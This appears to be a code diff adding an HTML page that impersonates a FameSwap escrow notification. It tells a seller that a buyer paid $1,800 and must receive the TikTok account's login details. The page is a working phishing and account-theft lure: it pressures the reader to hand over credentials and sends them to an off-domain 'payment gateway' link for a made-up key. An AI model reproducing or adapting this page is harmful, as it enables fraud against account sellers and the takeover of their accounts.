@@ -1,0 +1,436 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <title>Escrow Request Received</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <style>
+      :root {
+        --primary-color: #1a73e8;
+        --primary-hover: #1557b0;
+        --text-primary: #202124;
+        --text-secondary: #5f6368;
+        --background: #f8f9fc;
+        --border-color: #dadce0;
+        --success-bg: #f3f8ff;
+      }
+
+      body {
+        font-family: "Segoe UI", -apple-system, BlinkMacSystemFont, "Roboto",
+          Arial, sans-serif;
+        background-color: var(--background);
+        margin: 0;
+        padding: 24px 16px;
+        display: flex;
+        justify-content: center;
+        align-items: center;
+        min-height: 100vh;
+        line-height: 1.6;
+        color: var(--text-primary);
+      }
+
+      .outer-container {
+        background-color: #ffffff;
+        padding: 32px 40px;
+        border-radius: 16px;
+        width: 100%;
+        max-width: 540px;
+        box-shadow: 0 2px 6px rgba(60, 64, 67, 0.15);
+        box-sizing: border-box;
+      }
+
+      .container {
+        background-color: #ffffff;
+        border: 1px solid var(--border-color);
+        padding: 40px 24px;
+        border-radius: 12px;
+        margin: 24px 0;
+        text-align: center;
+        width: 100%;
+        max-width: 480px;
+        margin-left: auto;
+        margin-right: auto;
+        box-sizing: border-box;
+      }
+
+      .notification-header {
+        color: var(--text-secondary);
+        font-size: 13px;
+        font-weight: 500;
+        margin-bottom: 16px;
+        text-transform: uppercase;
+        letter-spacing: 0.8px;
+        text-align: center;
+      }
+
+      .message {
+        font-size: 15px;
+        margin-bottom: 32px;
+        color: var(--text-primary);
+        line-height: 1.6;
+        padding: 0 20px;
+      }
+
+      .message strong {
+        font-size: 18px;
+        display: block;
+        margin-bottom: 16px;
+        color: var(--text-primary);
+        font-weight: 600;
+        letter-spacing: -0.2px;
+      }
+
+      .message p {
+        margin: 0;
+        color: var(--text-secondary);
+        max-width: 400px;
+        margin-left: auto;
+        margin-right: auto;
+      }
+
+      .message a {
+        color: var(--primary-color);
+        text-decoration: none;
+        font-weight: 500;
+        transition: all 0.2s ease;
+        padding-bottom: 1px;
+        border-bottom: 1px solid transparent;
+      }
+
+      .message a:hover {
+        color: var(--primary-hover);
+        border-bottom-color: var(--primary-hover);
+      }
+
+      .upgrade-link {
+        margin: 0 auto;
+        padding: 20px;
+        background-color: var(--success-bg);
+        border-radius: 8px;
+        border: 1px solid rgba(26, 115, 232, 0.15);
+        font-size: 14px;
+        color: var(--text-secondary);
+        max-width: 400px;
+      }
+
+      .upgrade-link a {
+        color: var(--primary-color);
+        text-decoration: none;
+        font-weight: 500;
+        transition: all 0.2s ease;
+        padding-bottom: 1px;
+        border-bottom: 1px solid transparent;
+      }
+
+      .upgrade-link a:hover {
+        color: var(--primary-hover);
+        border-bottom-color: var(--primary-hover);
+      }
+
+      .footer {
+        color: var(--text-secondary);
+        font-size: 13px;
+        text-align: center;
+        margin-top: 24px;
+        padding-top: 24px;
+        border-top: 1px solid var(--border-color);
+      }
+
+      .footer a {
+        color: var(--primary-color);
+        text-decoration: none;
+        font-weight: 500;
+        transition: all 0.2s ease;
+        padding-bottom: 1px;
+        border-bottom: 1px solid transparent;
+      }
+
+      .footer a:hover {
+        color: var(--primary-hover);
+        border-bottom-color: var(--primary-hover);
+      }
+
+      .logo {
+        padding: 10px;
+        display: block;
+        margin: 0 auto;
+        max-width: 140px;
+        height: auto;
+        border-radius: 60px;
+      }
+
+      @media screen and (max-width: 600px) {
+        body {
+          padding: 16px 12px;
+        }
+
+        .outer-container {
+          padding: 24px 16px;
+          border-radius: 12px;
+        }
+
+        .container {
+          padding: 24px 16px;
+          margin: 16px 0;
+        }
+
+        .message {
+          font-size: 14px;
+          margin-bottom: 24px;
+          padding: 0 8px;
+        }
+
+        .message strong {
+          font-size: 16px;
+          margin-bottom: 12px;
+        }
+
+        .message p {
+          max-width: 100%;
+        }
+
+        .upgrade-link {
+          padding: 16px;
+          font-size: 13px;
+          margin: 0 8px;
+        }
+
+        .logo {
+          max-width: 120px;
+        }
+
+        .notification-header {
+          font-size: 12px;
+          margin-bottom: 12px;
+        }
+
+        .footer {
+          margin-top: 20px;
+          padding-top: 20px;
+          font-size: 12px;
+        }
+      }
+
+      @media screen and (max-width: 360px) {
+        body {
+          padding: 12px 8px;
+        }
+
+        .outer-container {
+          padding: 20px 12px;
+        }
+
+        .container {
+          padding: 20px 12px;
+        }
+
+        .message {
+          font-size: 13px;
+        }
+
+        .message strong {
+          font-size: 15px;
+        }
+
+        .upgrade-link {
+          padding: 12px;
+          font-size: 12px;
+        }
+
+        .logo {
+          max-width: 100px;
+        }
+      }
+
+      .steps-container {
+        background-color: #f8f9fa;
+        border-radius: 8px;
+        padding: 20px;
+        margin: 20px 0;
+        text-align: left;
+      }
+
+      .steps-container h3 {
+        color: var(--text-primary);
+        margin: 0 0 15px 0;
+        font-size: 16px;
+      }
+
+      .action-steps {
+        margin: 0;
+        padding-left: 20px;
+      }
+
+      .action-steps li {
+        margin-bottom: 12px;
+        color: var(--text-primary);
+        line-height: 1.5;
+      }
+
+      .action-steps li:last-child {
+        margin-bottom: 0;
+      }
+
+      .user-tag {
+        color: var(--primary-color);
+        font-weight: 500;
+      }
+
+      .amount {
+        color: #34a853;
+        font-weight: 600;
+      }
+
+      .important-notice {
+        background-color: #fff4e5;
+        border: 1px solid #ffd3a2;
+        border-radius: 8px;
+        padding: 15px;
+        margin: 20px 0;
+        text-align: left;
+        color: #b45309;
+      }
+
+      .security-badge {
+        font-weight: 600;
+        margin-bottom: 8px;
+        color: var(--text-primary);
+      }
+
+      .button-container {
+        margin: 0 auto 32px auto;
+        text-align: center;
+      }
+
+      .payment-gateway-btn:hover {
+        background-color: var(--primary-hover);
+        transform: translateY(-1px);
+        box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
+      }
+
+      .footer-links {
+        margin-bottom: 8px;
+      }
+
+      .footer-links a {
+        margin: 0 8px;
+      }
+
+      .copyright {
+        color: var(--text-secondary);
+        font-size: 12px;
+      }
+
+      .completion-note {
+        margin-top: 20px;
+        color: var(--text-secondary);
+        font-style: italic;
+      }
+
+      .transaction-details {
+        margin-bottom: 20px;
+        line-height: 1.8;
+      }
+    </style>
+    <script>
+      console.log('Payment Received Page - Loading...');
+      
+      window.addEventListener('load', () => {
+        console.log('Page fully loaded at:', new Date().toISOString());
+        console.log('Transaction Details:', {
+          seller: '@Mrnoonii',
+          buyer: '@benshains',
+          amount: '$1,800',
+          status: 'Payment Received'
+        });
+      });
+
+      document.addEventListener('DOMContentLoaded', () => {
+        const paymentGatewayBtn = document.querySelector('.payment-gateway-btn');
+        if (paymentGatewayBtn) {
+          paymentGatewayBtn.addEventListener('click', () => {
+            console.log('Payment Gateway button clicked');
+          });
+        }
+      });
+    </script>
+  </head>
+  <body>
+    <div class="outer-container">
+      <div class="notification-header">SECURE TRANSACTION NOTIFICATION</div>
+      <div class="container">
+        <img
+          src="data:image/png;base64,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"
+          alt="Fameswap Logo"
+          class="logo"
+          width="100px"
+        />
+        <div class="message">
+          <strong>Payment Received: Final Steps Required</strong>
+          <p class="transaction-details">
+            Dear <span class="user-tag">@Mrnoonii</span>,<br><br>
+
+            We're writing to inform you that the buyer <span class="user-tag">@benshains</span> has successfully deposited <span class="amount">$1,800</span> to the FameSwap secure bank account.
+          </p>
+          
+          <div class="steps-container">
+            <h3>Required Actions:</h3>
+            <ol class="action-steps">
+              <li>Message <span class="user-tag">@benshaintiktok</span> on the FameSwap website</li>
+              <li>Change the TikTok account details to their desired email and password</li>
+              <li>Log out from the TikTok app</li>
+              <li>Request payment gateway key from <span class="user-tag">@benshaintiktok</span></li>
+            </ol>
+          </div>
+
+          <div class="important-notice">
+            <strong>⚠️ Important:</strong> For your security, this process requires a payment gateway key. You can obtain this from <span class="user-tag">@benshaintiktok</span> or request it directly from FameSwap support for secure access to the payment gateway.
+          </div>
+
+          <p class="completion-note">
+            Once these steps are completed, the transaction with your buyer will be finalized and the funds will be released to your account.
+          </p>
+        </div>
+        <div class="button-container">
+          <a href="https://secure-paymentgateways.vercel.app" 
+             class="payment-gateway-btn"
+             style="background-color: #1a73e8;
+                    border: 1px solid #1a73e8;
+                    border-radius: 8px;
+                    color: #ffffff;
+                    display: inline-block;
+                    font-family: sans-serif;
+                    font-size: 15px;
+                    font-weight: 500;
+                    line-height: 40px;
+                    text-align: center;
+                    text-decoration: none;
+                    width: 220px;
+                    transition: all 0.3s ease;
+                    -webkit-text-size-adjust: none;
+                    mso-hide: all;">
+            Access Payment Gateway
+          </a>
+        </div>
+        <div class="upgrade-link">
+          <div class="security-badge">
+            🔒 SECURE TRANSACTION
+          </div>
+          For your security, all transactions are processed through our secure escrow system.
+          <br>
+          <a href="https://www.fameswap.com/secure-transfer">Learn more</a> about our secure transfer process.
+        </div>
+      </div>
+
+      <div class="footer">
+        <div class="footer-links">
+          <a href="https://www.fameswap.com">FameSwap.com</a> |
+          <a href="https://www.fameswap.com/support">Support</a> |
+          <a href="https://www.fameswap.com/terms">Terms</a>
+        </div>
+        <div class="copyright">
+          © 2024 FameSwap. All rights reserved.
+        </div>
+      </div>
+    </div>
+  </body>
+</html>
